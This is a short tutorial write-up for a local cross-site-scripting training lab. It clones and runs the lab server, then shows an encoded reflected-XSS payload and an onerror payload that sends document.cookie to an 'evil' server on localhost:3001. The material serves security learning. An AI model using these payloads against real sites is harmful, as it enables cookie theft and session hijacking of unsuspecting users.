# Local Host

- Now let's get started. In your terminal program, use git to download the project:

```git clone https://github.com/Learn-by-doing/xss.git```

- If successful, a new folder named xss should have been created.

Change directory into the new folder:

```cd xss```

- Install the project's dependencies using npm:

```npm install``` 

- Now we can run the local web server using Node.js:

```node server.js```

- If successful, you should see the following message: Server listening at localhost:3000. This means that a local web server is now running and is listening for requests at localhost:3000. Open your browser and click the link.

****
The interface

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/37c21fd7-a098-478f-8f19-8b651c958146)

after encoding this we can xss it

```encodeURIComponent('<img src="does-not-exist" onerror="alert(\'hi!\')">');```

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/43f0eaf8-ca18-43d0-9447-ece366ee83d8)


- so the final link is
```http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(%27hi!%27)%22%3E```

and we got the popup

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/5db48d6e-3304-4500-a385-1483aaf02f4a)

- Lets grep some cookie

```<img src="does-not-exist" onerror="alert(document.cookie)">```

- Now before continuing, we will need to start our "evil" web server. Run the following command in a second terminal window:

```node evil-server.js```


```<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">```

- how it goes in another redirected link
  
```
var img = document.createElement('img');
img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```



- which is out another server located in local host 3001

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/7af83daa-250e-4e95-96b4-7d2bcd51b995)

we got the cookie

